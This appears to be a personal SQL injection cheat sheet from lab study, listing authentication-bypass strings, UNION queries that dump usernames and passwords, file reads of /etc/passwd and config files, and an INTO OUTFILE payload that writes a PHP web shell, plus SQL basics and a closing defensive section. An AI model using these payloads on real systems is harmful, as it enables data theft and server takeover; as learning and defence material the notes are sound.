---
layout: default
---

<[Back to Main Page](./index.html)

# SQL Injection
Creared by Christopher Fitzsimons

## SQL Injection Queries
```sql
admin' OR '1'='1''  
admin'-- '  
admin'-- -'  
admin'# '  
admin')-- '  
' or 1=1 limit 1 -- -  

' order by 1-- -  
cn' UNION select 1,2,3,4-- -  
cn' UNION select 1,@@version,3,4-- -  
cn' UNION SELECT 1,table_schema,table_name,4 FROM information_schema.tables-- -  
cn' UNION SELECT 1,username,3,4 FROM users-- -  
cn' UNION SELECT 1,username,password,4 FROM users-- -  
cn' UNION SELECT * FROM my_database.users;  
cn' UNION SELECT 1,SCHEMA_NAME,3,4 FROM INFORMATION_SCHEMA.SCHEMATA;  
cn' UNION select 1,database(),2,3-- -  
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -  
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -  
cn' UNION select 1,page,3,4 FROM dev.pages-- -  
cn' UNION select 1,username,password,4 FROM dev.credentials-- -  

SELECT LOAD_FILE('/etc/passwd');  
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -  
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -  
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- -  

cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -  
cn' UNION SELECT 1,username,password,4 from users INTO OUTFILE '/tmp/credentials'-- -  
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';  
cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -  
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -  
http://167.172.56.232:30248/shell.php?0=cat%20../flag.txt  
```

## SQL Payloads
Payload URL Encoded  
'	%27  
"	%22  
\#	%23  
;	%3B  
)	%29  

## Fingerprinting
Payload	When to Use	Expected Output	Wrong Output  
```sql
SELECT @@version	When we have full query output	MySQL Version 'i.e. 10.3.22-MariaDB-1ubuntu1'	In MSSQL it returns MSSQL version. Error with other DBMS.  
SELECT POW(1,1)	When we only have numeric output	1	Error with other DBMS  
SELECT SLEEP(5)	Blind/No Output	Delays page response for 5 seconds and returns 0.	Will not delay response with other DBMS  
```

## Find User
```sql
SELECT USER()  
SELECT CURRENT_USER()  
SELECT user from mysql.user  
cn' UNION SELECT 1, user(), 3, 4-- -  
cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -  
SELECT super_priv FROM mysql.user  
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -  
cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges-- -  
```

## SQL Queries
```sql
CREATE DATABASE <dbname>;  
SHOW DATABASES;  
CREATE TABLE <tablename>(id INT,username VARCHAR(100),password VARCHAR(100),date_of_joining DATETIME);  
SHOW TABLES;  
DESCRIBE <tablename>;  
INSERT INTO <tablename> VALUES (column1_value, column2_value, column3_value, ...);  
INSERT INTO <tablename>(column2, column3, ...) VALUES (column2_value, column3_value, ...);  
SELECT * FROM <tablename>;  
SELECT column1, column2 FROM <tablename>;  
DROP TABLE <tablename>;  
ALTER TABLE <tablename> ADD newColumn INT;  
ALTER TABLE <tablename> RENAME COLUMN newColumn TO oldColumn;  
ALTER TABLE <tablename> MODIFY oldColumn DATE;  
ALTER TABLE <tablename> DROP oldColumn;  
UPDATE <tablename> SET column1=newvalue1, column2=newvalue2, ... WHERE <condition>;  
SELECT * FROM <tablename> ORDER BY password DESC;  
SELECT * FROM <tablename> ORDER BY password DESC, id ASC;  
SELECT * FROM <tablename> LIMIT 2;  
SELECT * FROM <tablename> LIMIT 1, 2;  
SELECT * FROM <tablename> WHERE <condition>;  
SELECT * FROM logins WHERE username LIKE 'admin%';  
SELECT * FROM logins WHERE username like '___';  
SELECT 1 = 1 AND 'test' = 'test';  
SELECT 1 = 1 OR 'test' = 'abc';  
SELECT NOT 1 = 1;  
SELECT 1 = 1 && 'test' = 'abc';  
SELECT 1 = 1 || 'test' = 'abc';  
SELECT 1 != 1;  
SELECT * FROM <tablename> UNION SELECT * FROM <tablename2>;  
SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '  
```

## Logging In
```bash
mysql -u <user> -h <host> -p<password> P<port>
```

## Notes
A data type defines what kind of value is to be held by a column. Common examples are numbers, strings, date, time, and binary data.

With Table properties you can set properties to values. For example AUTO_INCREMENT which you can set to the id to make it automaticly increment each row added to the table. (id INT NOT NULL AUTO_INCREMENT,)  
Some other properties are:  
The NOT NULL constraint ensures that a particular column is never left empty (username VARCHAR(100) UNIQUE NOT NULL,)  
DEFAULT keyword, which is used to specify the default value. (date_of_joining DATETIME DEFAULT NOW(),)  
PRIMARY KEY, which we can use to uniquely identify each record in the table, referring to all data of a record within a table for relational databases. (PRIMARY KEY (id))

If we wanted to LIMIT results with an offset, we could specify the offset before the LIMIT count. (LIMIT 1, 2)

String and date data types should be surrounded by single quote (') or double quotes ("), while numbers can be used directly.

The % symbol acts as a wildcard in LIKE queries. For example if you use "LIKE 'admin%'" it will match all characters after admin. It is used to match zero or more characters. Similarly, the _ symbol is used to match exactly one character. For example if you se "Like '___'" it fill match for three like "tom"

The AND operator takes in two conditions and returns true or false based on their evaluation.  
The OR operator takes in two expressions as well, and returns true when at least one of them evaluates to true.  
The NOT operator simply toggles a boolean value 'i.e. true is converted to false and vice versa'  
The AND, OR and NOT operators can also be represented as &&, || and !, respectively. The below are the same previous examples, by using the symbol operators:  
Division (/), Multiplication (*), and Modulus (%)  
Addition (+) and subtraction (-)  
Comparison (=, >, <, <=, >=, !=, LIKE)  
NOT (!)  
AND (&&)  
OR (||)  

If we use user-input within an SQL query, and if not securely coded, it may cause a variety of issues, like SQL Injection vulnerabilities.

Injection occurs when an application misinterprets user input as actual code rather than a string, changing the code flow and executing it. This can occur by escaping user-input bounds by injecting a special character like ('), and then writing code to be executed, like JavaScript code or SQL in SQL Injections. Unless the user input is sanitized, it is very likely to execute the injected code and run it.

We can escape the sql query by using ' to end the string and input SQL language into the Query.  
for example adding "admin' OR '1'='1''" or '%1'; DROP TABLE users;' it will change the query. As seen below:  
select * from logins where username = 'admin' OR '1'='1' AND password = 'blah' (Auth bypass)  
select * from logins where username like '%1'; DROP TABLE users;' (Command Injection)  

Types of SQL Injections. In-band, Blind and Out-of-band  
In simple cases, the output of both the intended and the new query may be printed directly on the front end, and we can directly read it. This is known as In-band SQL injection, and it has two types: Union Based and Error Based.  
With Union Based SQL injection, we may have to specify the exact location, 'i.e., column', which we can read, so the query will direct the output to be printed there. As for Error Based SQL injection, it is used when we can get the PHP or SQL errors in the front-end, and so we may intentionally cause an SQL error that returns the output of our query.  
In more complicated cases, we may not get the output printed, so we may utilize SQL logic to retrieve the output character by character. This is known as Blind SQL injection, and it also has two types: Boolean Based and Time Based.  
With Boolean Based SQL injection, we can use SQL conditional statements to control whether the page returns any output at all, 'i.e., original query response,' if our conditional statement returns true. As for Time Based SQL injections, we use SQL conditional statements that delay the page response if the conditional statement returns true using the Sleep() function.  
Finally, in some cases, we may not have direct access to the output whatsoever, so we may have to direct the output to a remote location, 'i.e., DNS record,' and then attempt to retrieve it from there. This is known as Out-of-band SQL injection.  

When you need a response to send back true, You can use '1'='1' in your injection as the SQL will see this as bein true even if the password is not correct and will send back a true response.

Just like any other language, SQL allows the use of comments as well. Comments are used to document queries or ignore a certain part of the query. We can use two types of line comments with MySQL -- and #, in addition to an in-line comment /**/ (though this is not usually used in SQL injections). The -- can be used as follows:  
SELECT username FROM logins; -- Selects usernames from the logins table   

In SQL, using two dashes only is not enough to start a comment. So, there has to be an empty space after them, so the comment starts with (-- ), with a space at the end. This is sometimes URL encoded as (--+), as spaces in URLs are encoded as (+). To make it clear, we will add another (-) at at the end (-- -), to show the use of a space character. Will look something like this:  
SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';  

SQL supports the usage of parenthesis if the application needs to check for particular conditions before others. Expressions within the parenthesis take precedence over other operators and are evaluated first.

The Union clause is used to combine results from multiple SELECT statements. This means that through a UNION injection, we will be able to SELECT and dump data from all across the DBMS, from multiple tables and databases.

The first three databases are default MySQL databases and are present on any server, so we usually ignore them during DB enumeration. Sometimes there's a fourth 'sys' DB as well.

mysqli_real_escape_string() can be used to sanatise PHP code.  
Other methords are to check that the input of the query is valid and expected. For example regex.
superuser or superadmin accounts should never be used by a web application. User accounts with read only should be used when only used for read activity. You cal also specify which tables it has access to.  
GRANT SELECT ON ilfreight.ports TO 'reader'@'localhost' IDENTIFIED BY 'p@ssw0Rd!!';

Another way to ensure that the input is safely sanitized is by using parameterized queries. Parameterized queries contain placeholders for the input data, which is then escaped and passed on by the drivers. Instead of directly passing the data into the SQL query, we use placeholders and then fill them with PHP functions.
